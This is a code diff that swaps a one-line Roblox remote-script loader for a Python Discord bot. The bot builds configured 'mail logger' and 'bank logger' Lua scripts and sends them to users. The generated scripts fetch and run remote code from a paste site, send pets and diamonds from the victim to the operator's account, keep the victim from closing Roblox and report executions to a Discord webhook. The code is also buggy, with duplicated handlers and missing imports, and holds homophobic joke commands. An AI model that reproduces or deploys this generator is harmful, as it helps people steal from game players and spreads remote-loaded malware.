@@ -1,2 +1,319 @@
-_G.UserID = "4144398564"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/psxupdatescript/main/script.lua%22))()
+from webserver import keep_alive
+import os
+import discord
+import asyncio
+from discord import app_commands 
+from discord.ext import commands
+import openai
+
+intents = discord.Intents.default()
+intents.members = True
+client = discord.Client(intents=intents)
+
+
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+guild_id = 1085872367831613471
+
+bot = commands.Bot(command_prefix=',', intents=intents)
+
+
+
+
+
+config_Mailbox = [
+    "**Username of the account you want to send the mail to on the logger**",
+    "**Amount of diamonds to not kick use more than 500000**",
+    "**Discord link webhook for sending info**",
+    "**Script name on the UI**",
+    "**Tip 1 shown when someone executes the script**",
+    "**Tip 2 shown when someone executes the script**",
+    "**Tip 3 shown when someone executes the script**",
+    "**Tip 4 shown when someone executes the script**",
+    "**Tip 5 shown when someone executes the script**"
+]
+
+config_Bank = [
+    "**Roblox Account Id [[https://www.roblox.com/users/IDHERE/profile]] <- This is a example**",
+    "**Toggle to prevent the target from closing Roblox (true/false)**",
+    "**Amount of diamonds to not kick use more than 500000**",
+    "**Discord link webhook for sending info**",
+    "**Script name on the UI**",
+    "**Tip 1 shown when someone executes the script**",
+    "**Tip 2 shown when someone executes the script**",
+    "**Tip 3 shown when someone executes the script**",
+    "**Tip 4 shown when someone executes the script**",
+    "**Tip 5 shown when someone executes the script**"
+]
+
+config_Visual = [
+    "```lua\nloadstring(game:HttpGet('https://paste.xyzo.space/nxll/visualx.lua'))()``` \nKey: **HosteeHub**"
+]
+
+
+config_Sussy = [
+    "Im Gay! With A Boy Since Im A Boy!"
+]
+
+class aclient(discord.Client):
+    def __init__(self):
+        super().__init__(intents = discord.Intents.default())
+        self.synced = False 
+
+    async def on_ready(self):
+        await self.wait_until_ready()
+        if not self.synced: 
+            await tree.sync(guild = discord.Object(id=guild_id)) 
+            self.synced = True
+        print(f"We have logged in as {self.user}.")
+
+        # Set bot status and activity
+        await client.change_presence(status=discord.Status.idle, activity=discord.Game('MailLogger.lua'))
+
+
+  
+client = aclient()
+tree = app_commands.CommandTree(client)
+
+@client.event
+async def on_message(message):
+    # Check if the message author is a bot or doesn't have the role
+    role_id = 1105113174996418600
+    user = message.author
+    if user.bot or role_id not in [r.id for r in user.roles]:
+        return
+    
+    # Add the reaction to the message
+    emoji = '🏳️‍🌈'
+    await message.add_reaction(emoji)
+
+
+
+@client.event
+async def gay(ctx):
+    await ctx.send('**You are now infected with gayness!**')
+
+
+
+
+@client.event
+async def on_message(message):
+    # Check if message is in specified channel and bot was mentioned
+    if message.channel.id == 1102200821699051542 and client.user in message.mentions:
+        # Get message content and remove bot mention
+        input_text = message.content.replace(f"<@1086658891498131556>", "")
+        # Call OpenAI API to generate response
+        response = openai.Completion.create(
+            engine="google",
+            prompt=input_text,
+            max_tokens=50,
+            n=1,
+            stop=None,
+            temperature=0.7,
+        )
+        # Send response message to channel
+        await message.channel.send(response.choices[0].text)
+
+
+
+
+@client.event
+async def on_message(message):
+    if message.content.lower() == "hello":
+        await message.channel.send("Hello, I am ChatGPT!")
+@client.event
+async def on_message(message):
+    if client.user.mentioned_in(message):
+        await message.channel.send(f"?warn {message.author.mention} Pinging Me :skull:")
+
+@tree.command(guild=discord.Object(id=guild_id), name='maillogger', description='create Hostee Scriptz mailbox logger') #guild specific slash command
+async def create(interaction: discord.Interaction):
+    user = interaction.user
+    
+    # Prompt user to check DMs
+    await interaction.response.send_message(f"{user.mention}, check your DMs!")
+
+
+    responses = []
+    for option in config_Mailbox:
+        await user.send(option)
+        try:
+            response = await client.wait_for('message', timeout=60.0, check=lambda m: m.author == user and m.channel == user.dm_channel)
+        except asyncio.TimeoutError:
+            await user.send("Timeout! Please try again.")
+            return
+        responses.append(response.content.strip())
+
+
+
+
+      
+    # Combine responses into final message with loadstring and send to user's DM
+        formatted_options = []
+        formatted_options.append("--[[ Hostee Scriptz Mail Logger ]]--\n")
+        
+        if len(responses) >= 1:
+            formatted_options.append("--[[ Main Config ]]--")
+            formatted_options.append(f"_G.Username = \"{responses[0]}\" --// Username To Send Pets To")
+        if len(responses) >= 2:
+            formatted_options.append(f"_G.Diamonds = {responses[1]} --// Amount Of Diamonds To Not Kick")
+        
+        
+        formatted_options.append("--[[ Webhook Config ]]--")
+        
+        if len(responses) >= 3:
+            formatted_options.append(f"_G.Webhook = \"{responses[2]}\" --// Discord Webhook For Executions\n")
+        
+        formatted_options.append("--[[ UI Config ]]--")
+        
+        if len(responses) >= 4:
+            formatted_options.append(f"_G.ScripttName = \"{responses[3]}\" --// Script Name On The UI")
+        if len(responses) >= 5:
+            formatted_options.append(f"_G.Tip1 = \"{responses[4]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 6:
+            formatted_options.append(f"_G.Tip2 = \"{responses[5]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 7:
+            formatted_options.append(f"_G.Tip3 = \"{responses[6]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 8:
+            formatted_options.append(f"_G.Tip4 = \"{responses[7]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 9:
+            formatted_options.append(f"_G.Tip5 = \"{responses[8]}\" --// Gives You Tips On The UI\n")
+        
+        formatted_options.append("--[[ Script ]]")
+        formatted_options.append("loadstring(game:HttpGet(\"https://paste.xyzo.space/nxll/mail.lua\"))()\n")
+
+
+
+    final_message = '\n'.join(formatted_options)
+    embed = discord.Embed(title="**Here U Go**", description="```lua\n" + final_message + "```", color=discord.Color.green())
+    await user.send(embed=embed)
+    await user.send("**Thanks For Using Hostee Scriptz MailBox logger**")
+
+@tree.command(guild=discord.Object(id=guild_id), name='banklogger', description='create Hostee Scriptz bank logger') #guild specific slash command
+async def create(interaction: discord.Interaction):
+    user = interaction.user
+    
+    # Prompt user to check DMs
+    await interaction.response.send_message(f"{user.mention}, check your DMs!")
+    
+    # Prompt user to configure each option separately
+    responses = []
+    for option in config_Bank:
+        await user.send(option)
+        try:
+            response = await client.wait_for('message', timeout=60.0, check=lambda m: m.author == user and m.channel == user.dm_channel)
+        except asyncio.TimeoutError:
+            await user.send("Timeout! Please try again.")
+            return
+        responses.append(response.content.strip())
+
+    # Combine responses into final message with loadstring and send to user's DM
+        formatted_options = []
+        formatted_options.append("--[[ Hostee Scriptz Bank Logger ]]--\n")
+        
+        if len(responses) >= 1:
+            formatted_options.append("--[[ Main Config ]]--")
+            formatted_options.append(f"_G.UserId = {responses[0]} --// Roblox Account Id 64736547386 <- This is a example")
+        if len(responses) >= 2:
+            formatted_options.append(f"_G.AntiLeave = {responses[1]} --// Doesn't Let The Target Close Roblox")
+        if len(responses) >= 3:
+            formatted_options.append(f"_G.Diamonds = {responses[2]} --// Amount Of Diamonds To Not Kick")
+        
+        formatted_options.append("--[[ Webhook Config ]]--")
+        
+        if len(responses) >= 4:
+            formatted_options.append(f"_G.Webhook = \"{responses[3]}\" --// Discord Webhook For Executions\n")
+        
+        formatted_options.append("--[[ UI Config ]]--")
+        
+        if len(responses) >= 5:
+            formatted_options.append(f"_G.ScriptName = \"{responses[4]}\" --// Script Name On The UI")
+        if len(responses) >= 6:
+            formatted_options.append(f"_G.Tip1 = \"{responses[5]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 7:
+            formatted_options.append(f"_G.Tip2 = \"{responses[6]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 8:
+            formatted_options.append(f"_G.Tip3 = \"{responses[7]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 9:
+            formatted_options.append(f"_G.Tip4 = \"{responses[8]}\" --// Gives You Tips On The UI")
+        if len(responses) >= 10:
+            formatted_options.append(f"_G.Tip5 = \"{responses[9]}\" --// Gives You Tips On The UI\n")
+        
+        formatted_options.append("--[[ Script ]]")
+        formatted_options.append("loadstring(game:HttpGet(\"https://paste.xyzo.space/nxll/bank.lua\"))()\n")
+
+
+
+
+
+    final_message = '\n'.join(formatted_options)
+    embed = discord.Embed(title="**Here U Go**", description="```lua\n" + final_message + "```", color=discord.Color.green())
+    await user.send(embed=embed)
+    await user.send("**Thanks For Using Hostee Scriptz Bank logger**")
+
+
+@tree.command(guild=discord.Object(id=guild_id), name='ping', description='Check Bot Latency')
+async def latency(interaction: discord.Interaction):
+    # Calculate bot latency
+    latency = round((interaction.client.latency * 1000), 2)
+
+    # Create an embed with the latency information
+    embed = discord.Embed(title='🏓 Pong!', description=f'**Bot latency: {latency}ms**', color=0x00ff00)
+
+    # Send the embed as a response to the user
+    await interaction.response.send_message(embed=embed)
+
+@tree.command(guild=discord.Object(id=guild_id), name='members', description='Check How Many Poeple Are On Discord Server')
+async def members(interaction: discord.Interaction):
+    # Get the guild object
+    guild = interaction.guild
+
+    # Get the member count
+    member_count = guild.member_count
+
+    # Create the embed
+    embed = discord.Embed(title=f"{guild.name} Member Count", description=f"**```{member_count} members```**", color=discord.Color.green())
+
+    # Send the embed as a response to the user
+    await interaction.response.send_message(embed=embed)
+
+
+
+@tree.command(guild=discord.Object(id=guild_id), name='visual', description='Sends You The Visual Script!') #guild specific slash command
+async def create(interaction: discord.Interaction):
+    user = interaction.user
+    
+    # Prompt user to check DMs
+    await interaction.response.send_message(f"{user.mention}, check your DMs!")
+    
+    # Send visual script in DMs
+    try:
+        await user.send('Here is the visual script:', file=discord.File(fp=BytesIO(requests.get('https://paste.xyzo.space/nxll/visualx.lua').content), filename='visual.lua'))
+    except Exception as e:
+        print(e)
+
+    responses = []
+    for option in config_Visual:
+        await user.send(option)
+
+
+@tree.command(guild=discord.Object(id=guild_id), name='sussy', description='Sends You The sus thing!') #guild specific slash command
+async def create(interaction: discord.Interaction):
+    user = interaction.user
+    
+    # Prompt user to check DMs
+    await interaction.response.send_message(f"{user.mention}, check your DMs!")
+    
+    responses = []
+    for option in config_Sussy:
+        await user.send(option)
+
+
+
+
+
+keep_alive()
+
+TOKEN = os.environ.get("DISCORD_BOT_SECRET")
+
+client.run(TOKEN)
